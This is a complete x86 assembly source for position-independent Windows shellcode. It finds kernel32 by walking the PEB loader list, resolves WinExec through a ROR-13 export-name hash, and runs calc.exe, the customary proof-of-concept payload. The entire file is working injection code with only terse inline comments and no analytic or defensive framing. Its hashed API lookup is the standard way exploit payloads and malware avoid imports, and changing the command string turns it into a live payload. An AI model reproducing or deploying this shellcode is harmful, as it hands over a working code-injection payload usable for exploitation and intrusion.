BITS 32

SECTION .code start=0x0

entry:
    pushad                      ; preserve all registers
    call base                   ; get our own position

base:
    pop ebx                     ; ebx == base
    call sub_get_module_handle  ; get module
    push 0xe8afe98              ; WinExec hash
    push eax                    ; module handle
    call sub_get_proc_address   ; get WinExec
    add esp, 8
    lea ecx, [ebx + (cmd-base)] ; load cmd string
    push dword 1                ; push uCmdShow
    push ecx                    ; push lpCmdLine
    call eax                    ; call WinExec
    popad                       ; restore all registers
    ret                         ; return
cmd:
    db 'C:\\windows\\system32\\calc.exe',0 

sub_get_module_handle:
        push ebx                        ; preserve contents of ebx
        xor ebx,ebx                     ; zero ebx for offset
        mov dword eax, [fs:ebx+0x30]    ; get TIB->PEB
        mov dword eax, [eax+0x0C]       ; get PEB->PEB_LDR_DATA
        mov dword eax, [eax+0x1C]       ; Modules in "init order"
        mov dword eax, [eax]            ; Move to second module "ntdll"
        mov dword eax, [eax]            ; Move to third module "kernel32"
        mov dword eax, [eax+0x08]       ; get base address
        pop ebx                         ; restore ebx
        ret

sub_get_proc_address:
        pushad                          ; preserve registers
        mov dword ebp, [esp+0x24]       ; get arg0: module
        mov dword eax, [ebp+0x3C]       ; get relative virtual address
        mov dword edi, [ebp+eax+0x78]   ; get export directory address
        add edi, ebp                    ; compute export directory
        mov dword ecx, [edi+0x18]       ; load number of entries
        mov dword ebx, [edi+0x20]       ; load export name table address
        add ebx, ebp                    ; compute export name table address

    next_entry:
        dec ecx                         ; get index / decrement index
        mov dword esi, [ebx+ecx*4]      ; get name address
        add esi, ebp                    ; compute name address
        xor eax, eax                    ; zero eax
        cdq                             ; zero edx using weird trick...

    checksum_loop:
        lodsb                           ; load a byte from name
        test al, al                     ; check if null
        jz checksum_end                 ; null reached -> exit
        ror edx, 13                     ; rotate checksum
        add edx, eax                    ; add byte to checksum
        jmp checksum_loop               ; go to next byte

    checksum_end:
        cmp dword edx, [esp+0x28]       ; compare to arg1: hash
        jnz next_entry                  ; does it match?

    entry_found:
        mov dword ebx, [edi+0x24]       ; load export ordinal table address
        add ebx, ebp                    ; compute export ordinal table
        mov word cx, [ebx+ecx*2]        ; use index to get ordinal number
        mov dword ebx, [edi+0x1c]       ; load export address table address
        add ebx, ebp                    ; compute export address table
        add dword ebp, [ebx+ecx*4]      ; index into export address table
        mov dword [esp+0x1c], ebp       ; put result into stack to align with
                                        ; eax
        popad                           ; restore registers
        ret
